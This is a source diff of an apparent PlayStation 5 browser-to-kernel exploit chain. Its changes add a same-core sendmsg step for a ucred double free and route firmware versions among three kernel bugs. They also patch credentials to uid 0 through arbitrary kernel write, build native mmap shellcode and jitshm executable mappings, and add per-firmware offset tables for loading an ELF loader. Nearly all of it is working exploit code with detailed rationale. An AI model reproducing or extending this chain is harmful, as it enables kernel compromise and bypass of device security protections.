-         * convicts the pinning change; spawn=4 live=4 clears it. */
-        if (i === 0)
-            beacon("refcnt spawn=" + threads.lastSpawn.iov
-                   + " live=" + threads.liveCount("iov"));
-        sys.sched_yield();
-        threads.drain("iov");
-    }
+    /* Set cr_refcnt back to 1 — with plain sendmsg on THIS thread, as upstream
+     * does, not with the iov worker threads.
+     *
+     * This is the fix for the `self=all` twins exhaustion: rounds=512
+     * nz=76800 tag=76800 self=76800, i.e. 150 sockets x 512 rounds where every
+     * socket read back its OWN rthdr and no two ever aliased. That is not a
+     * slow race, it is a stuck state — the ucred was never on the free list
+     * twice, so no pair can exist however long find_twins grinds.
+     *
+     * Why the worker version could not work: the ucred is freed by the thread
+     * running these syscalls, which init() pinned to MAIN_CORE, so the chunk
+     * goes to THAT core's UMA per-CPU bucket. The iov workers are spawned with
+     * rop.pin false (deliberately — pinning them wrecks the later race timing,
+     * FAILS #5), so each one allocates its iovec from whatever core it happens
+     * to land on. A chunk in core 5's bucket is invisible to every other core,
+     * so cr_refcnt was simply never written, the dup/close that follows found
+     * refcnt > 1, nothing was freed, and there was no double free to find.
+     *
+     * sendmsg fixes all of it at once and is exactly what poops does here
+     * (0x80 iterations, fd 0, msg_iov[0] = {iov_base=1, iov_len=1}):
+     *   - it runs on this thread, so the allocation is drawn from the SAME
+     *     per-CPU bucket the ucred was freed into;
+     *   - sys_sendmsg copyin's the iovec array BEFORE it ever looks at the fd
+     *     and frees it on the way out, so each call is an allocate-write-free
+     *     that can land on the target repeatedly — fd 0 not being a socket is
+     *     irrelevant, and the EFAULT from iov_base=1 is expected;
+     *   - 0x17 iovecs = 0x170 bytes, the same malloc bucket as the 0x168 ucred,
+     *     with iov_base landing exactly on cr_refcnt.
+     * Batched into one chain so all 128 run back-to-back on the pinned thread
+     * with no chance to migrate between them. */
+    const refcntBatch = [];
+    for (let i = 0; i < REFCNT_SENDMSG_N; i++)
+        refcntBatch.push([Number(SYSCALL_NUMS.sendmsg), 0n,
+                          BigInt(ST.msg_hdr), 0n]);
+    window.rop_worker.syscallBatch(refcntBatch);
+    beacon("refcnt sendmsg x" + REFCNT_SENDMSG_N + " (same-core, batched)");
 
     /* The kernel goes DIRTY the instant the double-free happens (inside
      * doubleFreeAndFindTwins below). Set the flag FIRST (synchronous, no yield)
@@ -1909,8 +2389,28 @@ function pfind(pid) {
 /* -------------------------------------------------------------- jailbreak */
 
 function ps5_jailbreak() {
-    const p = ST.curproc;
-    const cred = KRW.r64(p + 0x40n);
+    /* Validate every pointer before writing through it.
+     *
+     * This function used to chase p+0x40 / p+0x48 / p+0x3E8 / dyn+0 / eboot+0x40
+     * and write to all of them with no checks at all. That is the most dangerous
+     * unguarded code in the chain: by the time it runs we hold arbitrary kernel
+     * WRITE, so if curproc is wrong or a KRW read returns garbage, it does not
+     * fail — it scatters writes across unrelated kernel memory and panics the
+     * console, with the log ending mid-run and nothing to attribute it to.
+     *
+     * Every value here is a kernel pointer that must satisfy isKernelPtr, so
+     * checking costs one comparison per hop and converts a panic into a clean
+     * throw that run()'s caller can report. */
+    const need = (name, v) => {
+        if (!isKernelPtr(v))
+            throw new Error("ps5_jailbreak: " + name + " = " + hex(v)
+                            + " is not a kernel pointer — refusing to write "
+                            + "(KRW is unreliable or curproc is wrong)");
+        return v;
+    };
+
+    const p = need("curproc", ST.curproc);
+    const cred = need("p_ucred", KRW.r64(p + 0x40n));
     log("p_ucred=" + hex(cred) + " uid=" + hex(KRW.r32(cred + 0x04n)));
 
     KRW.w32(cred + 0x04n, 0);   // cr_uid
@@ -1938,20 +2438,20 @@ function ps5_jailbreak() {
        would not reliably grant. */
     KRW.w8 (cred + 0x83n, 0x80);   // cr_sceAttr[0], same as upstream
 
-    const p_fd   = KRW.r64(p + 0x48n);
-    const kern   = pfind(KERNEL_PID);
-    const kfd    = KRW.r64(kern + 0x48n);
-    const rootvn = KRW.r64(kfd + ROOTVNODE_OFFSET);
+    const p_fd   = need("p_fd", KRW.r64(p + 0x48n));
+    const kern   = need("pfind(0)", pfind(KERNEL_PID));
+    const kfd    = need("kernel p_fd", KRW.r64(kern + 0x48n));
+    const rootvn = need("rootvnode", KRW.r64(kfd + ROOTVNODE_OFFSET));
     KRW.w64(p_fd + 0x08n, rootvn);
     KRW.w64(p_fd + 0x10n, rootvn);
     KRW.w64(p_fd + 0x18n, 0);
 
-    const dyn = KRW.r64(p + 0x3E8n);
+    const dyn = need("p_dynlib", KRW.r64(p + 0x3E8n));
     KRW.w64(dyn + 0xF0n, 0);
     KRW.w64(dyn + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
 
-    const eboot = KRW.r64(dyn + 0x00n);
-    const segs  = KRW.r64(eboot + 0x40n);
+    const eboot = need("eboot obj", KRW.r64(dyn + 0x00n));
+    const segs  = need("eboot segs", KRW.r64(eboot + 0x40n));
     KRW.w64(segs + 0x08n, 0);
     KRW.w64(segs + 0x10n, 0xFFFFFFFFFFFFFFFFn);
 
@@ -2046,8 +2546,8 @@ function KRW_slow_ptr(addr, what) {
             return v;
         }
         beacon("slow ptr " + what + (err ? " err=" + err.slice(0, 40)
-                                          : " bad=" + hex(v))
-               + " retry " + (i + 1));
+                                          : " bad=" + hex(v) + " raw=" + lastLeakBytes(8))
+               + " @" + hex(addr) + " retry " + (i + 1));
     }
     throw new Error("slow rw: " + what + " never returned a kernel pointer");
 }
@@ -2102,6 +2602,22 @@ function make_karw() {
 
     const mrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE, "mrf");
     const vrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.victim_pipe[0]) * FILEDESCENT_SIZE, "vrf");
+
+    /* Report BOTH file pointers and the fds they came from before dereferencing
+     * either.
+     *
+     * A run died here with mrf/vrf/mrd all fine and vrd stuck at
+     * 0xa100000000000000 across all six retries — deterministic, so it is a
+     * real read of something, not race garbage. isKernelPtr(vrf) only proves
+     * vrf is canonical, not that it is a struct file: if the entry we read was
+     * stale or the wrong slot, *vrf is whatever that object holds and no amount
+     * of retrying changes it. The two pipes are created back to back, so their
+     * fds are adjacent and their file pointers normally come from the same
+     * allocation run — a vrf wildly unlike mrf is the tell. */
+    beacon("pipe files mfd=" + ST.master_pipe[0] + " vfd=" + ST.victim_pipe[0]
+           + " mrf=" + hex(mrf) + " vrf=" + hex(vrf)
+           + " delta=" + hex(vrf > mrf ? vrf - mrf : mrf - vrf));
+
     const mrd = KRW_slow_ptr(mrf, "mrd");
     const vrd = KRW_slow_ptr(vrf, "vrd");
     log("master_rpipe_data=" + hex(mrd) + " victim_rpipe_data=" + hex(vrd));
@@ -2457,7 +2973,27 @@ function kwrite_slow(addr, buf, size) {
 
 function KRW_slow_r64(addr) {
     const p = kread_slow(BigInt(addr), 8);
+    /* Keep the raw buffer so a rejected read can show its BYTES.
+     *
+     * "bad=0xa100000000000000" is not enough to act on: a one-byte copyout
+     * desync (the documented soreceive fault path), a 0x41 sentinel, an all-zero
+     * buffer and a genuinely wrong address all reduce to a single hex qword that
+     * looks equally wrong. The byte pattern separates them — 0x41 repeats say
+     * sentinel, a kernel pointer shifted by one or seven bytes says desync, and
+     * plausible non-pointer data says we read the wrong place. */
+    ST.lastLeak = p;
     return rd64at(p, 0x00);
+}
+
+// Hex dump of the last slow-read buffer, for failure beacons.
+function lastLeakBytes(n) {
+    if (!ST.lastLeak) return "?";
+    let s = "";
+    for (let i = 0; i < (n || 8); i++) {
+        const b = Number(rd8(ST.lastLeak, i)) & 0xff;
+        s += (b < 16 ? "0" : "") + b.toString(16);
+    }
+    return s;
 }
 
 function KRW_slow_write(dst, src, n) {
@@ -2488,14 +3024,36 @@ function run() {
                         + "(clears itself on reboot)");
 
     const fw = parseFloat((window.slopkit && window.slopkit.FW_VERSION) || "0");
-    log("PS5 netcontrol UAF — fw " + fw);
+    const fwk = sk_fw();
+    log("PS5 kernel stage — fw " + fwk);
     if (fw < 9.00) {
         log("fw " + fw + " below slopkit's WebKit floor (9.00) — kernel bug is " +
             "present but there is no userland R/W to drive it from");
         return false;
     }
-    if (fw > 12.00) {                          // poops.lua:25
-        log("fw " + fw + " above the netcontrol bug's range (<=12.00)");
+    /* THREE kernel bugs, and they PARTITION the firmware range — no overlap,
+     * so the firmware alone picks the route:
+     *
+     *   09.00 - 10.01   lapse   aio double free      (lapse-ps5.js)
+     *   10.20 - 12.00   poops   netcontrol UAF       (this file)
+     *   12.02 - 12.70   p2jb    cr_refcnt overflow   (this file)
+     *
+     * This used to claim netcontrol for 09.00-12.00, which overstated it by six
+     * firmwares: 09.00 through 10.01 are lapse's window, not netcontrol's.
+     * Sending one of those down the netcontrol path would grind find_twins
+     * against a bug that is not there and report it as a lost race — the exact
+     * failure mode that is hardest to tell from a real one.
+     *
+     * Everything after the double free is shared, so this is the only fork. */
+    if (LAPSE_FIRMWARES_KERNEL.has(fwk)) {
+        log("fw " + fwk + " is lapse's window (09.00-10.01), not netcontrol's — "
+            + "load lapse-ps5.js and call lapse_ps5.run()");
+        return false;
+    }
+    const useP2jb = P2JB_FIRMWARES.has(fwk);
+    if (!useP2jb && !NETCTRL_FIRMWARES.has(fwk)) {
+        log("fw " + fwk + " has no kernel route (lapse 09.00-10.01, "
+            + "netcontrol 10.20-12.00, p2jb 12.02-12.70)");
         return false;
     }
 
@@ -2536,7 +3094,12 @@ function run() {
     beacon("syscall " + _per.toFixed(3) + " ms; find_twins worst case "
            + Math.round(TWIN_ATTEMPTS * IPV6_SOCK_NUM * 2 * _per / 1000) + " s");
 
-    ucred_triple_free();
+    if (useP2jb) {
+        beacon("route: p2jb (cr_refcnt overflow) — expect ~50 min of spinning");
+        ucred_triple_free_p2jb();
+    } else {
+        ucred_triple_free();
+    }
     leak_kqueue();
     make_karw();
     find_allproc();
@@ -2563,6 +3126,62 @@ function run() {
         beacon("JB curproc=" + hex(ST.curproc) + " allproc=" + hex(ST.allproc));
     } catch (e) { beacon("JB proof failed: " + e.message); }
 
+    /* Everything below this point WRITES kernel memory — force_exec() stamps
+     * protection bits into a vm_map_entry, buildLapseKRW() rewrites a socket's
+     * pktopts, and elfldr is handed a kdata_base it keys all its own kernel
+     * offsets off. None of that is safe unless the jailbreak actually landed.
+     *
+     * It used to run unconditionally. The proof above is inside a try/catch
+     * that only BEACONS a failure, so a run where ps5_jailbreak() did not take
+     * — or where KRW is returning garbage — would print "KERNEL EXPLOITED",
+     * then compute kdata_base from a bogus allproc and let elfldr write to
+     * whatever kernel addresses that implies. That is the same "wrong is worse
+     * than missing" hazard as the hardcoded kdata_base, at whole-jailbreak
+     * scale, and it ends in a panic rather than an error message.
+     *
+     * So prove it first, and refuse rather than guess. */
+    function verifyJailbreak() {
+        const no = (why) => { beacon("JB VERIFY FAILED: " + why); return false; };
+
+        if (!isKernelPtr(ST.curproc)) return no("curproc " + hex(ST.curproc));
+        if (!isKernelPtr(ST.allproc)) return no("allproc " + hex(ST.allproc));
+
+        let ucred, uid, authid;
+        try {
+            ucred = KRW.r64(ST.curproc + 0x40n);
+            if (!isKernelPtr(ucred)) return no("ucred " + hex(ucred));
+            uid    = KRW.r32(ucred + 0x04n);
+            authid = KRW.r64(ucred + 0x58n);
+        } catch (e) { return no("kernel read threw: " + e.message); }
+
+        // ps5_jailbreak() sets both of these; if either is unchanged the
+        // escalation did not take even though nothing threw.
+        if (uid !== 0) return no("uid=" + uid + " (expected 0)");
+        if (authid !== SYSCORE_AUTHID)
+            return no("authid=" + hex(authid) + " expected " + hex(SYSCORE_AUTHID));
+
+        /* kdata_base is the one value elfldr cannot sanity-check for itself.
+         * Every kernel in the 9.00-12.00 window has it 64 KB aligned
+         * (text_base + text_size: 0x...EB0000 / ED0000 / F40000 / F60000), so a
+         * garbage allproc almost never produces an aligned result. KASLR moves
+         * the absolute value, which is why alignment is checked and not it. */
+        let kdata;
+        try { kdata = computeKdataBase(); } catch (e) { return no(e.message); }
+        if (!isKernelPtr(kdata) || (kdata & 0xFFFFn) !== 0n)
+            return no("kdata_base implausible: " + hex(kdata));
+
+        beacon("JB VERIFIED uid=0 authid=" + hex(authid)
+               + " kdata_base=" + hex(kdata));
+        return true;
+    }
+
+    if (!verifyJailbreak()) {
+        beacon("phase: NOT JAILBROKEN — skipping force_exec/elfldr");
+        log("jailbreak did not verify; refusing to write kernel memory or "
+            + "start elfldr (reboot before retrying)");
+        return false;
+    }
+
     // on-screen notification: kernel is exploited (uid=0, arbitrary kernel R/W)
     sendNotification("Poopsploit: KERNEL EXPLOITED (uid=0, kernel R/W)");
 
@@ -2582,6 +3201,21 @@ function run() {
      *       entry + 102 (0x66) = max_protection
      *   Entry list is circular through the map itself (the header is the map),
      *   next at +8, start at +32, end at +40.
+     *
+     * Those numbers were RE'd on 10.00 alone, which was fine while the chain only
+     * ran on 10.x. It is not fine now: this function WRITES kernel memory, so a
+     * struct that shifted on 11.x or 12.x would mean stamping protection bits
+     * into some unrelated vm_map_entry. So every constant was re-checked against
+     * all fourteen kernels in ps5_kernel_collection for 09.00-12.00, and all
+     * four hold unchanged on every one of them:
+     *   - vm_map_lookup_entry reads map->root at +0x1D0 (464) and tests
+     *     entry->start +0x20 / entry->end +0x28  (unique signature match, 14/14)
+     *   - vm_map_entry_splay rotates through left +0x10 / right +0x18, which is
+     *     the traversal this walker copies                      (14/14)
+     *   - vm_map_protect's refusal reads max_protection as a 16-bit word at
+     *     +0x66, and protection/max_protection are read as a +0x64/+0x66 pair
+     *     elsewhere, confirming BOTH halves of the 32-bit access below (14/14)
+     *   - sys_mprotect derefs td->td_proc->p_vmspace at proc +0x200   (14/14)
      *
      * So: find the entry covering our page and set both fields, then let the
      * normal mprotect succeed. Heavily guarded - this writes kernel memory, so
@@ -2643,6 +3277,22 @@ function run() {
      *   so buildLapseKRW() must construct it (see its spec).                 */
     const SYS_DYNLIB_DLSYM = 591;
     const R_X86_64_RELATIVE = 8;
+
+    /* The payload is NOT a 13.60-only build despite the name, and no per-firmware
+     * elfldr needs to be produced for this port.
+     *
+     * elfldr picks its own kernel offsets at runtime: its init routine (sub_6820)
+     * reads the running firmware version and switches on it, and that switch
+     * covers 1.00 through 13.60 — every firmware in this chain's 9.00-12.00
+     * window is an explicit case with its own offset set. So one binary serves
+     * all of them, and the only per-firmware thing WE owe it is a correct
+     * kdata_base (see ALLPROC_TO_KDATA / computeKdataBase below).
+     *
+     * The filename is kept as-is so already-hosted copies keep working; it is a
+     * misnomer, not a version constraint. If elfldr is ever rebuilt, the one
+     * thing to re-check is that switch, because a firmware it does not recognise
+     * makes its init return early and the payload never comes up. */
+    const ELFLDR_URL = "elfldr-ps5-1360.elf";
 
     // sync-fetch a served binary as a byte array (x-user-defined keeps bytes 1:1)
     function fetchBytes(url) {
@@ -2745,80 +3395,209 @@ function run() {
      * we already resolve at runtime (ST.allproc) minus that symbol's static RVA
      * in x86_kernel_1000.elf. NOT YET WIRED — needs the allproc RVA + confirming
      * elfldr's anchor == that base for the 10.00 sdk case. */
+    /* allproc's distance from kdata_base, per firmware.
+     *
+     * This used to be a single 10.00 constant, which silently produced a wrong
+     * kdata_base on every other firmware — and wrong is worse than missing here,
+     * because elfldr keys ALL of its own kernel offsets off this value, so a bad
+     * anchor means it writes to the wrong kernel addresses rather than failing.
+     *
+     * The values are not re-derived guesses: they are read straight out of
+     * elfldr-ps5.elf's own firmware switch (sub_6820), which for each firmware
+     * does `allproc = kdata_base + delta`. Taking elfldr's own numbers is what
+     * makes this correct by construction — we are computing the input to a
+     * function whose behaviour we are reading.
+     *
+     * Cross-checked twice against ps5_kernel_collection, since reading the right
+     * constant out of the wrong branch would be invisible otherwise:
+     *   1. elfldr's first store is `kdata_base - N`, and N equals the kernel
+     *      ELF's text PT_LOAD size on all 20 kernels in the 9.00-12.00 window
+     *      (9.x 0xCA0000, 10.x 0xCC0000, 11.x 0xD30000, 12.x 0xD50000) — so
+     *      kdata_base is text_base + text_size, exactly as the 10.00 note said.
+     *   2. Locating sx_init(&allproc_lock, "allproc") in each of those kernels
+     *      puts allproc_lock at kdata_base + delta - 0x20 on every single one —
+     *      a uniform sizeof(struct sx), with allproc immediately after it.
+     * Both checks agree for all 20 kernels, so the grouping below is the real
+     * build grouping and not an artifact of which branch I happened to read. */
+    const ALLPROC_TO_KDATA = {
+        "09.00": 0X2755D50n,
+        "09.20": 0X2755D50n,
+        "09.40": 0X2755D50n,
+        "09.60": 0X2755D50n,
+        "10.00": 0X2765D70n,
+        "10.01": 0X2765D70n,
+        "10.20": 0X2765D70n,
+        "10.40": 0X2765D70n,
+        "10.60": 0X2765D70n,
+        "11.00": 0X2875D70n,
+        "11.20": 0X2875D70n,
+        "11.40": 0X2875D70n,
+        "11.60": 0X2875D70n,
+        "12.00": 0X2885E00n,
+        "12.02": 0X2885E00n,
+        "12.20": 0X2885E00n,
+        "12.40": 0X2885E00n,
+        "12.60": 0X2885E00n,
+        "12.70": 0X2885E00n,
+    };
+
     function computeKdataBase() {
-        /* RE'd (pass 57 + elfldr sub_6820 10.00 case):
-         *   allproc static = 0xFFFFFFFF83635D70 (procinit: sx_init &allproc_lock
-         *     "allproc" then LIST_INIT zeroes it; runtime low bits 0xD70 match the
-         *     leaked allproc). text base = 0xFFFFFFFF80210000 -> ALLPROC_RVA
-         *     = 0x3425D70.
-         *   elfldr's 10.00 case (v9=0x10000000) sets unk_5CB50 = kdata_base
-         *     - 13369344, and 13369344 = 0xCC0000 = LOAD0 text filesz exactly, so
-         *     unk_5CB50 = kdata_base - text_size = text_base, i.e.
-         *     kdata_base = text_base + 0xCC0000.
-         *   => kdata_base = allproc - (0x3425D70 - 0xCC0000) = allproc - 0x2765D70. */
-        const ALLPROC_TO_KDATA = 0x2765D70n;
+        const fwv = String((window.slopkit && window.slopkit.FW_VERSION) || "");
+        const delta = ALLPROC_TO_KDATA[fwv];
+        if (delta === undefined)
+            throw new Error("computeKdataBase: no allproc->kdata delta for FW '"
+                            + fwv + "' — elfldr would be handed a bogus "
+                            + "kdata_base and patch the wrong kernel addresses");
         if (!ST.allproc) throw new Error("computeKdataBase: ST.allproc unset");
-        return BigInt(ST.allproc) - ALLPROC_TO_KDATA;
+        return BigInt(ST.allproc) - delta;
     }
 
-    /* Fresh RWX region via a NATIVE mmap stub. The worker-stack arena
-     * (mem.alloc) is ~331KB used of 450KB by the time we get here, too small for
-     * the ~381KB elfldr image. mmap is a 6-arg syscall needing r9=0, and there
-     * is no `pop r9` gadget anywhere (FAILS #15) - but that is a ROP limit only.
-     * Native shellcode sets r9 itself, so we emit a tiny mmap stub into the arena
-     * (small, fits), make it executable (force_exec+mprotect), and call it. Map
-     * RW then add X via the proven force_exec+mprotect path so the map itself
-     * never trips a W^X/max_protection gate. */
-    function mmapRWX(len) {
-        const PROT_RW = 3, PROT_RWX = 7, MAP_ANON_PRIV = 0x1002, SYS_mmap = 477;
-        const mlen = (len + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
-        const scratch = mem.alloc(0x60);
-        const stub = BigInt(scratch);
-        const outslot = stub + 0x50n;                 // stub writes mmap result here
-        R.wr64(outslot, 0n);
-        const le8 = (v) => {
-            const a = []; let x = BigInt(v);
-            for (let i = 0; i < 8; i++) { a.push(Number(x & 0xffn)); x >>= 8n; }
-            return a;
-        };
+    /* ---- executable memory for elfldr, the way the system already allows ----
+     *
+     * Previously this mapped one RW region and then FORCED execute on it by
+     * patching the vm_map_entry's protection/max_protection through kernel
+     * write, then mprotect'ing. That works, but it means kernel-patching a
+     * ~400 KB mapping to get W^X-violating RWX — the single riskiest write in
+     * the whole chain, and one that has to be right on four different kernel
+     * layouts.
+     *
+     * PS5 has a sanctioned mechanism for exactly this, and umtx2 uses it:
+     * jitshm. `jitshm_create` returns a handle to executable shared memory;
+     * `jitshm_alias` returns a second handle to the SAME physical pages with
+     * different protections. Map the first PROT_READ|EXEC and the second
+     * PROT_READ|WRITE, write code through the writable alias, execute it from
+     * the executable one. No page is ever W and X at once, so nothing has to be
+     * forced and no kernel protection bits are touched for the image at all.
+     *
+     * jitshm_create (3 args) and jitshm_alias (2 args) are plain ROP calls.
+     * Only mmap needs the native stub, because it takes six arguments and r9 is
+     * unreachable — re-verified across both modules on every firmware (pop r9,
+     * xor r9/r9, mov r9,<reg>, mov r9d/imm forms, and variants with extra pops
+     * before the ret): zero usable hits. So the bootstrap stub stays, but it is
+     * now the ONLY thing force_exec touches — one arena page instead of the
+     * whole payload image. */
+    /* libkernel_web exports the elfldr loader needs, per firmware.
+     *
+     * Resolved from each module's own dynamic symbol table by NID, not guessed:
+     * PS5 exports are named by NID (sha1-derived, e.g. pthread_create is
+     * "OxhIB8LB-PQ"), so looking the NID up in DT_SYMTAB/DT_STRTAB gives the
+     * exact st_value for that build. Every one below was checked to land on a
+     * real function prologue (`push rbp; mov rbp, rsp; ...`).
+     *
+     * pthread_join is resolved but intentionally unused — see the spawn site. */
+    const LIBKERNEL_FN = {
+        "09.00": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.20": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.40": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "09.60": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
+        "10.00": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.01": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.20": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.40": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "10.60": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
+        "11.00": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.20": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.40": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "11.60": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
+        "12.00": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.02": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.20": { pthread_create: 0X21150n, pthread_join: 0X22910n },
+        "12.40": { pthread_create: 0X21170n, pthread_join: 0X22930n },
+        "12.60": { pthread_create: 0X21170n, pthread_join: 0X22930n },
+        "12.70": { pthread_create: 0X21170n, pthread_join: 0X22930n },
+    };
+
+    function libkernelFn(name) {
+        const sk = window.slopkit || {};
+        const t = LIBKERNEL_FN[String(sk.FW_VERSION || "")];
+        if (!t || t[name] === undefined)
+            throw new Error("elfldr: no " + name + " offset for FW "
+                            + (sk.FW_VERSION || "?"));
+        return BigInt(sk.kernelBase) + t[name];
+    }
+
+    const SYS_JITSHM_CREATE = 533, SYS_JITSHM_ALIAS = 534;   // both kernels 9.00-12.00
+    const PROT_RW = 3, PROT_RX = 5, PROT_RWX = 7;
+    const MAP_SHARED_FIXED = 0x11;          // MAP_SHARED | MAP_FIXED
+    const MAP_ANON_PRIV_FIXED = 0x1012;     // MAP_ANON | MAP_PRIVATE | MAP_FIXED
+
+    const le8 = (v) => {
+        const a = []; let x = BigInt(v);
+        for (let i = 0; i < 8; i++) { a.push(Number(x & 0xffn)); x >>= 8n; }
+        return a;
+    };
+
+    /* One reusable native mmap trampoline, built and made executable ONCE.
+     * Reads all six arguments from a parameter block so a single stub serves
+     * every mapping; the old code emitted a fresh stub with immediates baked in
+     * per call, which meant a force_exec per mapping. */
+    let mmapStub = 0n, mmapParams = 0n;
+    function ensureMmapStub() {
+        if (mmapStub) return;
+        const scratch = mem.alloc(0x100);
+        mmapStub = BigInt(scratch);
+        mmapParams = mmapStub + 0x80n;      // 7 qwords: 6 args + result
         const code = [].concat(
-            [0x48, 0x31, 0xFF],                                       // xor rdi,rdi (addr=NULL)
-            [0x48, 0xBE], le8(BigInt(mlen)),                          // movabs rsi,mlen
-            [0xBA, PROT_RW, 0x00, 0x00, 0x00],                        // mov edx,3 (RW)
-            [0x49, 0xC7, 0xC2, MAP_ANON_PRIV & 0xff, (MAP_ANON_PRIV >> 8) & 0xff, 0x00, 0x00], // mov r10,0x1002
-            [0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF],               // mov r8,-1 (fd)
-            [0x4D, 0x31, 0xC9],                                       // xor r9,r9 (offset)
-            [0xB8, SYS_mmap & 0xff, (SYS_mmap >> 8) & 0xff, 0x00, 0x00], // mov eax,477
-            [0x0F, 0x05],                                             // syscall
-            [0x48, 0xA3], le8(outslot),                               // mov [outslot],rax
-            [0xC3]                                                    // ret
+            [0x53],                          // push rbx
+            [0x48, 0x89, 0xFB],              // mov rbx, rdi   (rdi = param block)
+            [0x48, 0x8B, 0x3B],              // mov rdi, [rbx+0x00]   addr
+            [0x48, 0x8B, 0x73, 0x08],        // mov rsi, [rbx+0x08]   len
+            [0x48, 0x8B, 0x53, 0x10],        // mov rdx, [rbx+0x10]   prot
+            [0x4C, 0x8B, 0x53, 0x18],        // mov r10, [rbx+0x18]   flags
+            [0x4C, 0x8B, 0x43, 0x20],        // mov r8,  [rbx+0x20]   fd
+            [0x4C, 0x8B, 0x4B, 0x28],        // mov r9,  [rbx+0x28]   offset
+            [0xB8, 477 & 0xff, (477 >> 8) & 0xff, 0x00, 0x00],  // mov eax, 477
+            [0x0F, 0x05],                    // syscall
+            [0x48, 0x89, 0x43, 0x30],        // mov [rbx+0x30], rax   result
+            [0x5B],                          // pop rbx
+            [0xC3]                           // ret
         );
-        for (let i = 0; i < code.length; i++) R.wr8(stub, i, code[i]);
+        for (let i = 0; i < code.length; i++) R.wr8(mmapStub, i, code[i]);
 
-        // make the stub executable (force_exec patches the arena vm_map entry;
-        // 2 pages covers a possible page straddle)
-        if (!force_exec(stub)) throw new Error("mmapRWX: force_exec(stub) failed");
-        const stubPage = stub & ~(BigInt(PAGE_SIZE) - 1n);
-        const smp = invoke("mprotect", stubPage, S(2 * PAGE_SIZE), S(PROT_RWX));
-        if (smp !== 0) throw new Error("mmapRWX: stub mprotect -> " + smp);
+        // The one and only force_exec: a single arena page holding this stub.
+        if (!force_exec(mmapStub)) throw new Error("mmap stub: force_exec failed");
+        const page = mmapStub & ~(BigInt(PAGE_SIZE) - 1n);
+        const mp = invoke("mprotect", page, S(2 * PAGE_SIZE), S(PROT_RWX));
+        if (mp !== 0) throw new Error("mmap stub: mprotect -> " + mp);
+        beacon("mmap stub armed @" + hex(mmapStub));
+    }
 
-        // call the stub: rets into it, it does mmap + stores rax to outslot + rets
-        window.rop_worker.fireSync((c) => c.call(stub));
-        const region = R.rd64(outslot);
-        if (region <= 0x10000n || (region & 0x3fffn) !== 0n)   // reject -1/errno/misaligned
-            throw new Error("mmapRWX: mmap failed region=" + hex(region));
+    function nativeMmap(addr, len, prot, flags, fd, off) {
+        ensureMmapStub();
+        // mmapParams is already a BigInt (mem.alloc -> rop-worker's bump
+        // allocator returns W.stack + bump); wr64at BigInt()s both operands, so
+        // pass it straight through rather than round-tripping via Number.
+        wr64at(mmapParams, 0x00, BigInt(addr));
+        wr64at(mmapParams, 0x08, BigInt(len));
+        wr64at(mmapParams, 0x10, BigInt(prot));
+        wr64at(mmapParams, 0x18, BigInt(flags));
+        wr64at(mmapParams, 0x20, BigInt(fd));
+        wr64at(mmapParams, 0x28, BigInt(off));
+        R.wr64(mmapParams + 0x30n, 0n);
+        window.rop_worker.fireSync((c) => c.pop("rdi", mmapParams).call(mmapStub));
+        return R.rd64(mmapParams + 0x30n);
+    }
 
-        // add execute to the fresh region
-        if (!force_exec(region)) throw new Error("mmapRWX: force_exec(region) failed");
-        const rmp = invoke("mprotect", region, S(mlen), S(PROT_RWX));
-        beacon("mmap region=" + hex(region) + " len=0x" + mlen.toString(16)
-               + " mprotect=" + rmp);
-        if (rmp !== 0) throw new Error("mmapRWX: region mprotect -> " + rmp);
-        return region;
+    /* Executable mapping + writable alias of the same pages, at a fixed base. */
+    function jitshmPair(base, shadow, len) {
+        const execH = invoke("jitshm_create", 0n, S(len), S(PROT_RWX)) | 0;
+        if (execH < 0) throw new Error("jitshm_create -> " + execH);
+        const writeH = invoke("jitshm_alias", S(execH), S(PROT_RW)) | 0;
+        if (writeH < 0) throw new Error("jitshm_alias -> " + writeH);
+
+        const x = nativeMmap(base, len, PROT_RX, MAP_SHARED_FIXED, execH, 0);
+        const w = nativeMmap(shadow, len, PROT_RW, MAP_SHARED_FIXED, writeH, 0);
+        beacon("jitshm exec=" + hex(x) + " write=" + hex(w)
+               + " len=0x" + len.toString(16) + " h=" + execH + "/" + writeH);
+        if ((x & 0xfffn) !== 0n || x === 0xFFFFFFFFFFFFFFFFn)
+            throw new Error("jitshm exec map failed: " + hex(x));
+        if ((w & 0xfffn) !== 0n || w === 0xFFFFFFFFFFFFFFFFn)
+            throw new Error("jitshm write map failed: " + hex(w));
+        return { exec: x, write: w };
     }
 
     function loadElfldr() {
-        const buf = fetchBytes("elfldr-ps5-1360.elf");
+        const buf = fetchBytes(ELFLDR_URL);
         beacon("elfldr fetched " + buf.length + "B");
         const u16 = (o) => (buf[o] | (buf[o + 1] << 8)) & 0xffff;
         const u32 = (o) => (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
@@ -2836,9 +3615,10 @@ function run() {
         for (let i = 0; i < e_phnum; i++) {
             const o = e_phoff + i * 0x38;
             const pt = u32(o);
+            const pflags = u32(o + 4);      // needed to tell text from data
             const poff = Number(u64(o + 8)), pva = Number(u64(o + 0x10));
             const pfsz = Number(u64(o + 0x20)), pmsz = Number(u64(o + 0x28));
-            if (pt === 1) { loads.push({ poff, pva, pfsz, pmsz }); if (pva + pmsz > maxva) maxva = pva + pmsz; }
